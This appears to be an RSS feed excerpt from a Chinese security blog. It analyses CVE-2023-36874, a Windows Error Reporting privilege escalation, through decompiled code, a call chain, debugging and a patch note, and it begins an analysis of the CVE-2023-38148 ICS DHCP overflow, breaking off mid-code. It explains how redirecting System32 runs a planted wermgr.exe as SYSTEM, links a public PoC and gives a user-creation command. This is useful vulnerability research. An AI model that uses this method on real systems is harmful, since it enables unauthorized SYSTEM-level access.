IWerKeyValueList<span style="color:#f92672">**</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc8(<span style="color:#75715e">/* Stack Offset: 8 */</span> IWerStringList<span style="color:#f92672">**</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc9(<span style="color:#75715e">/* Stack Offset: 8 */</span><span style="color:#66d9ef">int64_t</span><span style="color:#f92672">*</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc10(<span style="color:#75715e">/* Stack Offset: 8 */</span><span style="color:#66d9ef">int64_t</span><span style="color:#f92672">*</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc11(<span style="color:#75715e">/* Stack Offset: 8 */</span> BSTR<span style="color:#f92672">*</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc12(<span style="color:#75715e">/* Stack Offset: 8 */</span> BSTR<span style="color:#f92672">*</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc13(<span style="color:#75715e">/* Stack Offset: 8 */</span> IWerStringList<span style="color:#f92672">**</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc14(<span style="color:#75715e">/* Stack Offset: 8 */</span> IWerStringList<span style="color:#f92672">**</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc15(<span style="color:#75715e">/* Stack Offset: 8 */</span><span style="color:#66d9ef">int64_t</span><span style="color:#f92672">*</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc16(<span style="color:#75715e">/* Stack Offset: 8 */</span><span style="color:#66d9ef">struct</span><span style="color:#a6e22e">Struct_1</span><span style="color:#f92672">*</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc17(<span style="color:#75715e">/* Stack Offset: 8 */</span><span style="color:#66d9ef">int64_t</span><span style="color:#f92672">*</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc18(<span style="color:#75715e">/* Stack Offset: 8 */</span><span style="color:#66d9ef">int64_t</span><span style="color:#f92672">*</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc19(<span style="color:#75715e">/* Stack Offset: 8 */</span><span style="color:#66d9ef">int64_t</span><span style="color:#f92672">*</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc20(<span style="color:#75715e">/* Stack Offset: 8 */</span> BSTR p0,<span style="color:#75715e">/* Stack Offset: 16 */</span> BSTR<span style="color:#f92672">*</span> p1);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc21(<span style="color:#75715e">/* Stack Offset: 8 */</span> BSTR<span style="color:#f92672">*</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc22(<span style="color:#75715e">/* Stack Offset: 8 */</span><span style="color:#66d9ef">int64_t</span> p0,<span style="color:#75715e">/* Stack Offset: 16 */</span><span style="color:#66d9ef">int64_t</span><span style="color:#f92672">*</span> p1,<span style="color:#75715e">/* Stack Offset: 24 */</span><span style="color:#66d9ef">int64_t</span><span style="color:#f92672">*</span> p2,<span style="color:#75715e">/* Stack Offset: 32 */</span> BSTR<span style="color:#f92672">*</span> p3,<span style="color:#75715e">/* Stack Offset: 40 */</span> BSTR<span style="color:#f92672">*</span> p4);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc23(<span style="color:#75715e">/* Stack Offset: 8 */</span><span style="color:#66d9ef">int64_t</span> p0,<span style="color:#75715e">/* Stack Offset: 16 */</span> BSTR<span style="color:#f92672">*</span> p1);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc24(<span style="color:#75715e">/* Stack Offset: 8 */</span> BSTR p0,<span style="color:#75715e">/* Stack Offset: 16 */</span><span style="color:#66d9ef">int64_t</span> p1,<span style="color:#75715e">/* Stack Offset: 24 */</span> IWerReportSubmitCallback<span style="color:#f92672">*</span> p2,<span style="color:#75715e">/* Stack Offset: 32 */</span><span style="color:#75715e">/* unique */</span>BSTR<span style="color:#f92672">*</span> p3,<span style="color:#75715e">/* Stack Offset: 40 */</span><span style="color:#75715e">/* unique */</span><span style="color:#66d9ef">int64_t</span><span style="color:#f92672">*</span> p4);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc25();</span></span><span style="display:flex;"><span>};</span></span></code></pre></div><p>这里需要知道Windows的[[../../../05 Windows/COM模型/COM模型 OVERVIEW|COM模型)，COM模型定义了二进制标准，以支持组件复用。将操作系统API抽象成了接口，可以通过接口的标识符实例化COM对象并通过COM对象调用服务接口。即</p><p>当使用COM接口调用error reporting 服务并提交错误报告时，error reporting会启动<code>C:\Windows\System32\wermgr.exe</code>，并且启动时权限为<code>NT AUTHORITY\SYSTEM</code>。<img alt="" src="/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230912112511.png"/></p><p><img alt="" src="/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230912112524.png"/></p><p><img alt="" src="/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230912112334.png"/></p><p><strong>追溯调用栈</strong>
查看此事件的调用栈，<code>wer!WerpAuxmdMapFile+0x3887d</code> 处调用了<code>CreateProcessW</code></p><p><img alt="" src="/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230912112618.png"/></p><p><code>wer!WerpAuxmdMapFile+0x3887d</code>位于<code>UtilLaunchWerManager</code>函数内，代码如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">UtilLaunchWerManager</span>(</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">**</span>a1,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> a2,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> a3,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>a4,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#f92672">**</span>a5,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#f92672">**</span>a6,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a7,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#f92672">**</span>a8)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> ....</span></span><span style="display:flex;"><span> WCHAR Buffer[<span style="color:#ae81ff">264</span>];<span style="color:#75715e">// [rsp+148h] [rbp+40h] BYREF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v43<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>i64;</span></span><span style="display:flex;"><span> v39<span style="color:#f92672">=</span> a1;</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span> a5;</span></span><span style="display:flex;"><span> lpValue<span style="color:#f92672">=</span> a8;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset_0</span>(Buffer,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x208u</span>i64);</span></span><span style="display:flex;"><span> lpCommandLine[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> lpCommandLine[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_67;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v11<span style="color:#f92672">=</span><span style="color:#a6e22e">StringCchCatW</span>(Buffer,<span style="color:#ae81ff">0x104u</span>i64,<span style="color:#e6db74">L</span><span style="color:#e6db74">"</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">wermgr.exe"</span>);</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span> v11;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v11<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span> CString<span style="color:#f92672">::</span><span style="color:#a6e22e">Sprintf</span>((CString<span style="color:#f92672">*</span>)lpCommandLine,<span style="color:#e6db74">L</span><span style="color:#e6db74">"</span><span style="color:#ae81ff">\"</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\"</span><span style="color:#e6db74"> "</span>, Buffer);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (v12<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0x80000000</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( WPP_GLOBAL_Control<span style="color:#f92672">!=</span> (HKEY)<span style="color:#f92672">&amp;</span>WPP_GLOBAL_Control<span style="color:#f92672">&amp;&amp;</span> ((_BYTE)WPP_GLOBAL_Control[<span style="color:#ae81ff">7</span>]<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">WPP_SF_S</span>(<span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)WPP_GLOBAL_Control<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>),<span style="color:#ae81ff">20</span>i64,<span style="color:#f92672">&amp;</span>WPP_80b9a2815f1633611b5141c011dbf465_Traceguids, Buffer);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_37;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_38;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v13<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v14<span style="color:#f92672">=</span> lpCommandLine[<span style="color:#ae81ff">0</span>];</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v13<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0xE</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span> v19<span style="color:#f92672">=</span> CString<span style="color:#f92672">::</span><span style="color:#a6e22e">Append</span>((CString<span style="color:#f92672">*</span>)lpCommandLine, v40[<span style="color:#ae81ff">0</span>]);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v19<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span> WPP_GLOBAL_Control<span style="color:#f92672">==</span> (HKEY)<span style="color:#f92672">&amp;</span>WPP_GLOBAL_Control<span style="color:#f92672">||</span> ((_BYTE)WPP_GLOBAL_Control[<span style="color:#ae81ff">7</span>]<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v14<span style="color:#f92672">=</span> lpCommandLine[<span style="color:#ae81ff">0</span>];</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> ....</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">UpdateProcThreadAttribute</span>(v10,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x20002u</span>i64, lpValue,<span style="color:#ae81ff">8</span>i64<span style="color:#f92672">*</span> a7,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> StartupInfo.cb<span style="color:#f92672">=</span><span style="color:#ae81ff">112</span>;</span></span><span style="display:flex;"><span> v45<span style="color:#f92672">=</span> v10;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">CreateProcessW</span>(Buffer, v14,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0x80000u</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#f92672">&amp;</span>StartupInfo,<span style="color:#f92672">&amp;</span>hObject) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>向上追溯调用栈，<code>UtilLaunchWerManager</code>函数由<code>CReportManager::ReportProblemOutOfProcess</code>调用， 再上层函数为<code>CReportManager::ReportProblem</code>，<code>CReportManager::ReportProblem</code>由<code>ReportHandleInstance::SubmitReport</code>调用，<code>在上层函数为WerpSubmitReportFromStore</code>。在<code>wecplsupport!DllCanUnloadNew+0x2bf2</code>处调用了<code>wer.dll!WerpSubmitReportFromStore</code>函数。</p><p><code>wercplsupport!DllCanUnloadNew+0x2bf2</code>实际位于<code>wercplsupport!CWerComReport::_SubmitReport</code>函数内，代码如下。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CWerComReport<span style="color:#f92672">::</span><span style="color:#a6e22e">_SubmitReport</span>(</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#f92672">**</span>this,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>a2,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a3,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> IUnknown<span style="color:#f92672">*</span>a4,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">**</span>a5,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>a6)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> v24<span style="color:#f92672">=</span><span style="color:#f92672">&amp;</span>CStubUI<span style="color:#f92672">::</span><span style="color:#960050;background-color:#1e0010">`</span>vftable<span style="color:#960050;background-color:#1e0010">'</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( a4 )</span></span><span style="display:flex;"><span> ((<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">*</span>)(<span style="color:#66d9ef">struct</span> IUnknown<span style="color:#f92672">*</span>))a4<span style="color:#f92672">-></span>lpVtbl<span style="color:#f92672">-></span>AddRef)(a4);</span></span><span style="display:flex;"><span> v25<span style="color:#f92672">=</span> a4;</span></span><span style="display:flex;"><span> v23[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> TokenHandle<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v26<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span> a5;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( a5 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SysFreeString</span>(<span style="color:#f92672">*</span>a5);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>v10<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> WerApiLock<span style="color:#f92672">=</span> CWerApiAutoLock<span style="color:#f92672">::</span><span style="color:#a6e22e">TryGetWerApiLock</span>((CWerApiAutoLock<span style="color:#f92672">*</span>)v23, (<span style="color:#66d9ef">struct</span> CWerComReport<span style="color:#f92672">*</span>)this);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( WerApiLock<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> CurrentThread<span style="color:#f92672">=</span><span style="color:#a6e22e">GetCurrentThread</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">OpenThreadToken</span>(CurrentThread,<span style="color:#ae81ff">0xF01FFu</span>,<span style="color:#ae81ff">1</span>,<span style="color:#f92672">&amp;</span>TokenHandle)<span style="color:#f92672">||</span><span style="color:#a6e22e">GetLastError</span>()<span style="color:#f92672">==</span><span style="color:#ae81ff">1008</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> WerApiLock<span style="color:#f92672">=</span><span style="color:#a6e22e">WerpSubmitReportFromStore</span>(</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((<span style="color:#66d9ef">void</span><span style="color:#f92672">**</span>)this[<span style="color:#ae81ff">5</span>]<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>),</span></span><span style="display:flex;"><span> a2,</span></span><span style="display:flex;"><span> this[<span style="color:#ae81ff">4</span>],</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">struct</span> IReportUI<span style="color:#f92672">*</span>)((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v24<span style="color:#f92672">&amp;</span><span style="color:#f92672">-</span>(<span style="color:#66d9ef">__int64</span>)(a4<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>i64)),</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span>v21,</span></span><span style="display:flex;"><span> a3,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">enum</span> _WER_SUBMIT_RESULT<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v20);</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><code>_SubmitReport</code>由<code>CWerComReport::SubmitReport</code>调用，而<code>CWerComReport::SubmitReport</code>为<code>IWerReport</code>接口公开的函数。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CWerComReport<span style="color:#f92672">::</span><span style="color:#a6e22e">SubmitReport</span>(</span></span><span style="display:flex;"><span> CWerComReport<span style="color:#f92672">*</span>this,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>a2,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a3,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> IWerReportSubmitCallback<span style="color:#f92672">*</span>a4,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">**</span>a5,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>a6)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> v10;<span style="color:#75715e">// ebx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v12;<span style="color:#75715e">// [rsp+30h] [rbp-18h] BYREF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v13;<span style="color:#75715e">// [rsp+38h] [rbp-10h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v13<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>i64;</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>CAutoImpersonate<span style="color:#f92672">::</span>g_bEnableImpersonate</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (v10<span style="color:#f92672">=</span> CAutoImpersonate<span style="color:#f92672">::</span><span style="color:#a6e22e">ImpersonateUserHighestPrivs</span>((CAutoImpersonate<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v12), v10<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span>) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span> CWerComReport<span style="color:#f92672">::</span><span style="color:#a6e22e">_SubmitReport</span>((CWerComReport<span style="color:#f92672">*</span>)((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)this<span style="color:#f92672">-</span><span style="color:#ae81ff">24</span>), a2, a3, a4, a5, a6);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> CAutoImpersonate<span style="color:#f92672">::~</span><span style="color:#a6e22e">CAutoImpersonate</span>((CAutoImpersonate<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v12);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v10;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>所以可以总结出调用链：<code>wecplsupport!CWerComReport::SubmitReport->wecplsupport!CWerComReport::_SubmitReport->wer.dll!WerpSubmitReportFromStore...->CreateProcessW</code></p><p>问题在于在调用CreateProcessW时，CreateProcessW会使用攻击者设置的文件重定向，但将使用调用CreateProcessW的进程的security token设置进程的context，而不是模拟token来设置进程的security context。</p><p><img alt="" src="/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230912193450.png"/></p><p><img alt="" src="/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230912193521.png"/></p><p>也就是攻击者可以通过文件重定向将<code>C:\Windows\System32</code>重定向到攻击者可控目录，并且在可控目录写入恶意<code>wermgr.exe</code>，当触发CreateProcessW时，CreateProcessW将使用攻击者控制的目录的wermgr.exe文件而不是系统在<code>C:\Windows\System32</code>目录下的wermgr.exe文件。并且该进程上下文继承了调用进程的上下文，即继承了wer服务的权限。</p><p><strong>动态调试</strong>
在<code>UtilLaunchWerManager</code>断点</p><pre tabindex="0"><code>bp wer!UtilLaunchWerManager</code></pre><p>调试器断下</p><pre tabindex="0"><code>0:006> g
Breakpoint 2 hit
wer!UtilLaunchWerManager+0xf3:
00007ffb`7b11a23f e87cb3f7ff call wer!StringCchCatW (00007ffb`7b0955c0)
0:006> rrcx
rcx=00000041e2efbce0</code></pre><p><strong>补丁分析</strong>
前面知道补丁直接阻断了后续调用_submit，也就没办法再调用CreateProcess，从而阻断了调用链。</p><p>PoC</p><pre tabindex="0"><code>https://github.com/Wh04m1001/CVE-2023-36874</code></pre><p>需要注意的是运行poc需要使用不在<code>admin</code>组的用户，新增用户运行</p><pre tabindex="0"><code>net user test 123456 /add</code></pre><p><strong>参考链接</strong></p><blockquote><p><a href="https://www.crowdstrike.com/blog/falcon-complete-zero-day-exploit-cve-2023-36874/" target="_blank">https://www.crowdstrike.com/blog/falcon-complete-zero-day-exploit-cve-2023-36874/</a></p></blockquote><p><strong>Created at 2023-09-19T10:26:14+08:00</strong></p></description></item><item><title>CVE-2023-38148 Windows Ics Rce分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/</link><pubDate>Mon, 18 Sep 2023 16:18:40 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/</guid><description><h3 id="基本信息">基本信息</h3><p>依赖于ICS服务，Internet Connect Sharing，对应注册表，依赖<code>ipnathlp.dll</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-reg" data-lang="reg"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess</span></span></span></code></pre></div><p>漏洞存在于处理DHCP请求时，由于没有检查边界，导致在使用memset时使用的长度参数来源于数据包内，可以导致栈溢出。
服务调试参考第二个参考链接。</p><h3 id="影响版本">影响版本</h3><p>略</p><h3 id="环境搭建">环境搭建</h3><p>参考<a href="https://github.com/ruijanlee/h3cc/blob/master/h3cc_ruijanlee/doc/c8.md" target="_blank">https://github.com/ruijanlee/h3cc/blob/master/h3cc_ruijanlee/doc/c8.md</a> ，同时加一个Linux，网卡使用第二个网卡，使得Linux发出的DHCP包能够被Windows接收到。</p><h3 id="技术分析调试">技术分析&amp;调试</h3><h4 id="静态分析">静态分析</h4><p>对比补丁修复前后的逻辑，有两个明显的不同点，有两种产生漏洞的可能的地方。</p><ol><li>在修复版本中在进行<code>if ( *((_BYTE *)a2 + 230) > 0x20u )</code>判断之前先调用了<code>DumpDhcpHeaderInfo</code>，在漏洞代码中先进行判断在调用<code>DumpDhcpHeaderInfo</code></li><li>在修复版本中如果满足<code>if ( *((_BYTE *)a2 + 230) > 0x20u )</code> 则进入if内，<strong>在结束if语句时会通过跳转略过一部分处理逻辑，而在未修复版本内则还会继续处理。</strong></li></ol><p>可以看出<code>a2 + 230</code>为<code>_NH_BUFFER</code> 结构体内的某个长度字段，该处为判断这个长度字段存储的长度，该漏洞应该是溢出漏洞，并且在产生漏洞的地方需要读取该字段。</p><p>所以漏洞应该是第二点所说的，产生在略过的逻辑中。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// 未修复代码</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">void</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">DhcpProcessMessage</span>(<span style="color:#66d9ef">struct</span> _DHCP_INTERFACE<span style="color:#f92672">*</span>a1,<span style="color:#66d9ef">struct</span> _NH_BUFFER<span style="color:#f92672">*</span>a2)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset_0</span>(<span style="color:#f92672">&amp;</span>v12,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x40u</span>i64);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((_BYTE<span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#ae81ff">230</span>)<span style="color:#f92672">></span><span style="color:#ae81ff">0x20u</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v4<span style="color:#f92672">!=</span> (CInterfaceMonitor<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>WPP_GLOBAL_Control<span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">*</span>((_BYTE<span style="color:#f92672">*</span>)v4<span style="color:#f92672">+</span><span style="color:#ae81ff">28</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&amp;&amp;</span><span style="color:#f92672">*</span>((_BYTE<span style="color:#f92672">*</span>)v4<span style="color:#f92672">+</span><span style="color:#ae81ff">25</span>)<span style="color:#f92672">>=</span><span style="color:#ae81ff">4u</span> )</span></span><span style="display:flex;"><span><span 